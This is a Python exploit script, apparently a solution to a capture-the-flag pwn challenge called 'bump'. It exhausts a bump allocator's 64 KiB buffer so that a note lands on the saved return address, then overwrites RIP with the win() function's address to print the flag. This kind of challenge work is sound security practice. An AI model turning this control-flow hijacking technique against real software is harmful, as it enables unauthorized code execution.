#!/usr/bin/env python3
import os
import re
import socket
import struct
import time


HOST = os.environ.get("HOST", "pwn-bump.purple.ctfcompetition.com")
PORT = int(os.environ.get("PORT", "1337"))


def recv_until(sock: socket.socket, token: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while token not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def send_line(sock: socket.socket, line: bytes):
    if not line.endswith(b"\n"):
        line += b"\n"
    sock.sendall(line)


def parse_win_addr_from_elf() -> int:
    # parse with regex from `nm -C` output to avoid heavy deps
    try:
        import subprocess

        output = subprocess.check_output(["nm", "-C", "./chal"]).decode()
        for row in output.splitlines():
            # format: 0000000000401196 T win
            if re.search(r"\bwin$", row):
                addr_str = row.split()[0]
                return int(addr_str, 16)
    except Exception:
        pass
    # fallback (non-PIE typical); adjust if needed
    raise SystemExit("Could not resolve win() address. Ensure bin and 'nm' available.")


def make(sock: socket.socket, size: int):
    recv_until(sock, b"what do you want to do?")
    send_line(sock, b"1")
    recv_until(sock, b"how big should the note be?")
    send_line(sock, str(size).encode())
    line = recv_until(sock, b"\n").splitlines()[-1]
    # try to parse index
    m = re.search(rb"index\s+(\d+)$", line)
    idx = int(m.group(1)) if m else None
    return idx


def write_note(sock: socket.socket, idx: int, data: bytes):
    recv_until(sock, b"what do you want to do?")
    send_line(sock, b"2")
    recv_until(sock, b"which note do you want to write to?")
    send_line(sock, str(idx).encode())
    recv_until(sock, b"what do you want to write?")
    sock.sendall(data + b"\n")


def exit_program(sock: socket.socket):
    recv_until(sock, b"what do you want to do?")
    send_line(sock, b"5")


def solve():
    win_addr = parse_win_addr_from_elf()
    print(f"[+] win @ 0x{win_addr:x}")

    with socket.create_connection((HOST, PORT)) as sock:
        # 64 allocations of 1024 fill the 64 KiB buffer exactly
        for _ in range(64):
            make(sock, 1024)

        # 16-byte slot covering canary + saved RBP (size 1 -> 16 due to align)
        make(sock, 1)

        # next chunk starts at saved return address
        idx = make(sock, 64) or 65

        # overwrite RIP with win address
        payload = struct.pack("<Q", win_addr)
        write_note(sock, idx, payload)

        # trigger return
        exit_program(sock)

        # read flag
        time.sleep(0.5)
        try:
            sock.settimeout(2.0)
            print(sock.recv(4096).decode(errors="ignore"))
        except Exception:
            pass


if __name__ == "__main__":
    solve()


